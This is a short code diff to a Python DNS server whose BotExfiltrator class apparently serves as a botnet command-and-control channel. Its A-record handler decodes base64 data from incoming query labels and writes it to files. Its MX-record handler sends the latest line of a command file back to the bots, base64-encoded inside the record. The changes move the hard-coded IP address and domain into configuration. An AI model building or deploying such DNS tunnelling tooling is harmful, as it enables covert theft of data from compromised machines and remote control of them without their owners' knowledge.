@@ -29,7 +29,6 @@ class DNSServer(BaseRequestHandler):
     def AAAA(self, name):
         pass
         
-        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
     def A(self, name):
         pass
 
@@ -49,7 +48,7 @@ class BotExfiltrator(DNSServer):
         super(BotExfiltrator, self).__init__(request, client_address, server)
 
     def AAAA(self, name):
-        return RR(name, QTYPE.A, rdata=A(), ttl=0)
+        return RR(name, QTYPE.A, rdata=A(self.context['ip']), ttl=0)
 
     def A(self, name):
         rfilename = name.label[1].decode('utf-8')
@@ -63,7 +62,7 @@ class BotExfiltrator(DNSServer):
                 f.write(base64.b64decode(name.label[0]))
         except:
             pass
-        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
+        return RR(name, QTYPE.A, rdata=A(self.context['ip']), ttl=0)
 
     def MX(self, name):
         try:
@@ -71,7 +70,7 @@ class BotExfiltrator(DNSServer):
                  cmd = base64.standard_b64encode(f.readlines()[-1][:-1])
         except:
             cmd = base64.standard_b64encode('')
-        return RR(name, QTYPE.MX, rdata=MX(cmd + "." + DOMAIN_NAME), ttl=0)
+        return RR(name, QTYPE.MX, rdata=MX(cmd + "." + self.context['domain']), ttl=0)
 
 
 # Run the actual server. 
